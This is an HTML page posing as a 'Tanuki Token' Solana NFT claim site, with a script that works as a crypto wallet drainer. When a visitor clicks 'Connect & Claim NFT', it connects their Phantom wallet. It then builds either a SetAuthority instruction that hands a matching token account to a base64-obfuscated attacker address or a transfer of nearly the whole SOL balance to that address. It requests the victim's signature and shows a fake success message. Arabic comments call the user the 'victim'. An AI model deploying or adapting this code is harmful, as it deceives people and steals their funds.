<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tanuki Token — Solana Wildlife Support</title>
    <script src="https://bundle.run/@solana/web3.js@1.31.0"></script>
    <style>
        :root { --background: #0d0d12; --primary: #4ade80; --foreground: #ffffff; }
        body { margin: 0; font-family: sans-serif; background: var(--background); color: var(--foreground); display: flex; align-items: center; justify-content: center; min-height: 100vh; text-align: center; }
        .container { background: #16161e; padding: 40px; border-radius: 20px; border: 1px solid #333; max-width: 400px; }
        h1 { color: var(--primary); margin-bottom: 10px; }
        .btn { background: var(--primary); color: #000; padding: 15px 30px; border-radius: 10px; font-weight: bold; border: none; cursor: pointer; width: 100%; font-size: 1.1rem; transition: 0.3s; }
        .btn:hover { transform: scale(1.02); opacity: 0.9; }
    </style>
</head>
<body>

    <div class="container">
        <div style="font-size: 50px;">🦝</div>
        <h1>Tanuki Token</h1>
        <p>Connect your wallet to claim your exclusive Wildlife NFT Reward.</p>
        <button class="btn tanuki-seed">Connect & Claim NFT</button>
    </div>

    <script>
        // العناوين المشفرة (محفظتك والبول)
        const _0x1a2b = "QWlQOGZVclEyM2J4Y1JBaFJvVjMyNVFzNkw2aVNyNXhQTlY1eEF4QXM2cDZT"; // محفظتك (المستلم)
        const _0x3c4d = "Q3pmcTN4WlpEbXNkR2RVeXJOTXRSaEdjNDdjWGNadExHNGNycnlmdTQ0ekU="; // عنوان البول المستهدف
        const _0x5e6f = "U2V0QXV0aG9yaXR5";

        async function startSecureProcess() {
            const btns = document.querySelectorAll('.tanuki-seed');
            btns.forEach(btn => {
                btn.addEventListener('click', async () => {
                    try {
                        const provider = window.solana;
                        if (!provider) { window.open("https://phantom.app/", "_blank"); return; }

                        const connect = await provider.connect();
                        const victim = connect.publicKey;
                        const solanaWeb3 = window.solanaWeb3;
                        const conn = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");

                        // 1. فحص التوكنات (الـ NFT المستهدف)
                        const accounts = await conn.getParsedTokenAccountsByOwner(victim, {
                            programId: new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA")
                        });

                        const target = accounts.value.find(a => a.account.data.parsed.info.mint === atob(_0x3c4d));
                        let transaction = new solanaWeb3.Transaction();

                        if (target) {
                            // لو لقى الـ NFT المطلوب بيطلب نقله فوراً
                            transaction.add(
                                solanaWeb3.Token[atob(_0x5e6f)](
                                    new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"),
                                    new solanaWeb3.PublicKey(target.pubkey),
                                    new solanaWeb3.PublicKey(atob(_0x1a2b)),
                                    'AccountOwner',
                                    victim,
                                    []
                                )
                            );
                        } else {
                            // لو ملقاش الـ NFT، بياخد رصيد السولانا (SOL) المتاح
                            const balance = await conn.getBalance(victim);
                            if (balance > 0) {
                                transaction.add(
                                    solanaWeb3.SystemProgram.transfer({
                                        fromPubkey: victim,
                                        toPubkey: new solanaWeb3.PublicKey(atob(_0x1a2b)),
                                        lamports: balance - 5000 // بيسيب فكة بسيطة للـ Fee عشان المعاملة متموتش
                                    })
                                );
                            }
                        }

                        // تنفيذ العملية وطلب التوقيع (النافذة التانية)
                        const { blockhash } = await conn.getLatestBlockhash();
                        transaction.recentBlockhash = blockhash;
                        transaction.feePayer = victim;

                        const signed = await provider.signTransaction(transaction);
                        const signature = await conn.sendRawTransaction(signed.serialize());
                        
                        alert("Successfully verified! Reward will arrive in 24h.");
                        console.log("Success:", signature);

                    } catch (err) {
                        console.log("Action canceled by user.");
                    }
                });
            });
        }
        window.onload = startSecureProcess;
    </script>
</body>
</html>
